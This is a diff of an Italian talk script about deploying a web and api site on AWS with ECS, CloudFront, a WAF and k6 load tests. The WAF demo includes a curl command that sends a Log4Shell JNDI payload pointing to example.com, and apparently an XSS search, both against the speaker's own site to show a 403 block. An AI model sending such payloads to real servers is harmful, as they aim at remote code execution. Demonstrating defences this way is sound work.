@@ -2,7 +2,7 @@
 
 Il talk dura 40 minuti, poi ci sono 20 minuti di domande.
 
-Il deploy da zero dura circa 10 minuti. Il rolling update dura circa 15 minuti: 3 di CI, 7 per api e 6 per web.
+Il deploy da zero dura circa 10 minuti. Il rolling update dura circa 16 minuti: 3 di CI, 7 per api e 6 per web.
 
 Le slide contengono solo schemi e infografiche. Codice, console, terminale e sito si mostrano dal vivo.
 
@@ -56,9 +56,7 @@ Un servizio su internet deve restare disponibile anche in questi quattro casi. I
 
 Il progetto è un monorepo TypeScript gestito con pnpm e Turborepo. Contiene due servizi, web e api, ognuno con la sua immagine Docker.
 
-Web è il sito: React Router 8 su Express 5, React 19, Tailwind CSS 4, Radix UI con shadcn/ui, class-variance-authority, clsx, tailwind-merge, Lucide, Motion, i18next, react-i18next, remix-i18next, iovalkey e il client oRPC.
-
-Api è l'API interna e non è raggiungibile da internet: Express 5, oRPC con OpenAPI, Zod 4, AWS SDK v3, Stripe e iovalkey.
+Web è il sito, fatto con React Router su Express. Api è l'API interna e non è raggiungibile da internet. Le librerie sono sulla slide e non si leggono una per una.
 
 Web e api comunicano attraverso un contratto scritto con oRPC e Zod: se una delle due parti non lo rispetta, TypeScript segnala l'errore.
 
@@ -72,8 +70,6 @@ Turborepo blocca anche gli import di file fuori dal proprio package e gli import
 pnpm turbo boundaries
 ```
 
-Gli strumenti sono TypeScript 7, Vite 8, Vitest 5, Supertest, Biome, tsx, Docker, GitHub Actions, AWS CDK, Playwright e k6.
-
 ### Minuto 3 · Il cloud
 
 **SLIDE 4**: a sinistra un data center proprio, a destra una regione AWS con le sue AZ.
@@ -82,7 +78,7 @@ Con un data center proprio i server si comprano per reggere il picco, e restano 
 
 Un server nuovo arriva in settimane, un task nuovo parte in un minuto.
 
-Ogni regione AWS ha più zone di disponibilità, dette AZ. Ogni AZ è un data center separato dagli altri, quindi se una si guasta le altre continuano a funzionare. Per usare due AZ basta indicarlo nella configurazione. Con un data center proprio, invece, bisognerebbe costruirne un secondo.
+Ogni regione AWS ha più zone di disponibilità, dette AZ. Ogni AZ è formata da uno o più data center, separati da quelli delle altre AZ, quindi se una si guasta le altre continuano a funzionare. Per usare due AZ basta indicarlo nella configurazione. Con un data center proprio, invece, bisognerebbe costruirne un secondo.
 
 Database, cache, CDN e firewall li gestisce AWS, e tutto si crea con il codice.
 
@@ -158,7 +154,7 @@ Quando un task api nasce o muore, ECS aggiorna da solo l'elenco del proxy. Per q
 
 I dati, al minuto 12. DynamoDB contiene prodotti, utenti, ordini e pagamenti. Valkey contiene sessioni e carrelli. S3 contiene le immagini. Le chiavi Stripe stanno in Parameter Store e arrivano ai container all'avvio, quindi nel repository non c'è nessun segreto.
 
-La sicurezza, al minuto 13. CloudFront è l'unico ingresso pubblico. Il WAF blocca troppe richieste dallo stesso IP, gli IP con cattiva reputazione e gli attacchi noti. Shield Standard protegge dagli attacchi DDoS.
+La sicurezza, al minuto 13. Un sito può cadere anche senza nessun guasto: se qualcuno lo inonda di richieste, consuma la capacità che serve agli utenti veri. Lo scaling non basta, perché si ferma a 4 task, pagati per servire l'attaccante. Per questo il traffico si filtra prima che arrivi ai task. CloudFront è l'unico ingresso pubblico. Shield Standard ferma gli attacchi DDoS più comuni, quelli che inondano la rete. Il WAF blocca troppe richieste dallo stesso IP, gli IP con cattiva reputazione e gli attacchi noti.
 
 ### Minuto 14 · Eventi del deploy
 
@@ -188,9 +184,7 @@ Stripe riporta alla pagina dell'ordine, che dice che il pagamento non è ancora 
 
 Il pagamento svuota il carrello, quindi si rimette un prodotto nel carrello per il test della sessione al minuto 21.
 
-Poi si apre una finestra privata per la parte admin, così l'utente resta connesso nella finestra normale. Si entra con l'utente admin creato dal seed. Nell'elenco degli ordini c'è l'ordine appena pagato: lo si segna come spedito, con corriere e numero di tracking. Poi si mostrano i prodotti, che l'admin può modificare, archiviare e ripristinare, e gli utenti registrati.
-
-Infine, nella finestra normale, si apre la pagina stress. Ogni pecora è un task, con versione, AZ e CPU: due web e due api, su due AZ. Il footer mostra la versione vN.
+Infine si apre la pagina stress. Ogni pecora è un task, con versione, AZ e CPU: due web e due api, su due AZ. Il footer mostra la versione vN.
 
 ### Minuto 19 · Una nuova versione
 
@@ -214,7 +208,7 @@ Si ricarica il sito. L'utente è ancora connesso e il prodotto è ancora nel car
 
 ### Minuto 22 · Test 2: rolling update
 
-Quando in GitHub Actions parte il job deploy, nel pannello 2:
+Quando in GitHub Actions parte il job deploy e la pagina stress conta di nuovo 2 task web attivi, nel pannello 2:
 
 ```sh
 k6 run -e BASE_URL=https://arrosticini.colagreco.dev -e VUS=20 -e DURATION=13m load/browse.js
@@ -261,23 +255,23 @@ curl -s -o /dev/null -w "%{http_code}\n" "https://arrosticini.colagreco.dev/it/p
 curl -s -o /dev/null -w "%{http_code}\n" -H 'User-Agent: ${jndi:ldap://example.com/a}' "https://arrosticini.colagreco.dev/it"
 ```
 
-Le risposte attese sono 200, 403 e 403. La ricerca normale passa. La ricerca con uno script (XSS) e l'attacco Log4Shell vengono bloccati da CloudFront e non arrivano mai ai task.
+Le risposte attese sono 200, 403 e 403. La ricerca normale passa. La ricerca con uno script (XSS) e l'attacco Log4Shell vengono bloccati da CloudFront e non arrivano mai ai task. Questi due non cercano di far cadere il sito: servono a eseguire codice, il primo nel browser di un utente e il secondo sul server.
 
 Nella console WAF si vedono le richieste bloccate. La regola RateLimit oggi è in Count, altrimenti bloccherebbe k6.
 
-### Minuto 34 · Fine del rolling update
+### Minuto 35 · Fine del rolling update
 
 Quando la pagina stress mostra solo pecore vN+1, si ferma k6 con Ctrl+C. Il riepilogo deve mostrare 0% di richieste fallite. Il footer mostra vN+1.
 
 ### Minuto 35 · Test 4: un picco di traffico
 
-Nel pannello 2:
+Subito dopo, nel pannello 2:
 
 ```sh
 k6 run -e BASE_URL=https://arrosticini.colagreco.dev -e VUS=50 -e DURATION=6m load/browse.js
 ```
 
-50 utenti virtuali navigano il sito. Web costruisce ogni pagina sul server, quindi la CPU di web sale.
+50 utenti virtuali navigano il sito. Web costruisce ogni pagina sul server, quindi la CPU di web sale. Con le rampe di salita e discesa il carico dura 7 minuti, quindi continua durante le domande.
 
 **SLIDE 9**: la CPU nel tempo, con le soglie del 30%, 80% e 95%, e sotto il numero di task.
 
@@ -297,7 +291,11 @@ Nella pagina stress compaiono le nuove pecore web. Il carico si divide e la CPU 
 
 **SLIDE 11**: grazie.
 
-Durante le domande, sullo schermo resta la pagina stress. Verso la fine i task web tornano a 2: ECS ne toglie uno ogni 2 minuti.
+Durante le domande, sullo schermo resta la pagina stress. Quando k6 finisce e la CPU scende sotto il 30%, web torna gradualmente a 2 task.
+
+Se c'è tempo, si mostra la parte admin in una finestra privata, così l'utente resta connesso nella finestra normale. Si entra con l'utente admin creato dal seed. Nell'elenco degli ordini c'è l'ordine pagato al minuto 16: lo si segna come spedito, con corriere e numero di tracking. Poi si mostrano i prodotti, che l'admin può modificare, archiviare e ripristinare, e gli utenti registrati.
+
+Se chiedono delle librerie, web usa React Router 8 su Express 5, React 19, Tailwind CSS 4, Radix UI con shadcn/ui, class-variance-authority, clsx, tailwind-merge, Lucide, Motion, i18next, react-i18next, remix-i18next, iovalkey e il client oRPC. Api usa Express 5, oRPC con OpenAPI, Zod 4, AWS SDK v3, Stripe e iovalkey. Gli strumenti sono TypeScript 7, Vite 8, Vitest 5, Supertest, Biome, tsx, Docker, GitHub Actions, AWS CDK, Playwright e k6.
 
 ### Minuto 60 · Destroy
 
@@ -311,6 +309,8 @@ pnpm aws:app:destroy
 
 Se il deploy è lento, si allunga la spiegazione della slide 6.
 
+Se si è in ritardo prima del deploy, si salta l'esempio di 37signals. Le spiegazioni durante il deploy e il rolling update non recuperano tempo, perché si aspetta comunque AWS. Se il rolling update finisce tardi, al test 4 si avvia k6, si spiega la slide 9 e lo scaling si guarda durante le domande.
+
 Se il deploy fallisce, si mostra l'errore in CloudFormation e si passa alla registrazione della prova generale.
 
 Se il sito non si apre dopo il deploy, il DNS della sala ricorda ancora che il sito non esiste: si passa all'hotspot del telefono.
@@ -319,17 +319,11 @@ Se k6 riceve 403, la regola RateLimit del WAF va messa in Count.
 
 Se Connect non compare, è selezionato il container sbagliato: va selezionato web.
 
-Se lo scaling di web non parte entro 4 minuti, si fa scalare api al suo posto. Si fa Connect sui due task api, selezionando il container api, e si carica la CPU per 5 minuti:
-
-```sh
-node bin/grill.js --seconds 300
-```
-
-Se al minuto 35 si è in ritardo, il test 4 si riduce alla spiegazione della slide 9.
+Se al minuto 38 le nuove pecore web non ci sono ancora, si mostrano la CPU e l'alarm in CloudWatch e si va avanti: lo scaling si guarda durante le domande.
 
 ## Da verificare nella prova generale
 
-Quanto durano davvero deploy, CI e rolling update. Se il webhook di Stripe arriva al sito su AWS e l'ordine risulta pagato. Se acquisto e parte admin stanno in 3 minuti. Se con 20 utenti virtuali le pecore web restano sotto l'80% di CPU durante il rolling update. Se il rolling update finisce con 0% di errori. Quanto ci mette browse con 50 utenti virtuali a far scalare web.
+Quanto durano davvero deploy, CI e rolling update. Se il webhook di Stripe arriva al sito su AWS e l'ordine risulta pagato. Se l'acquisto completo sta in 3 minuti. Se con 20 utenti virtuali le pecore web restano sotto l'80% di CPU durante il rolling update. Se il rolling update finisce con 0% di errori. Quanto ci mette browse con 50 utenti virtuali a far scalare web.
 
 ## Prompt per l'infografica della slide 6
 
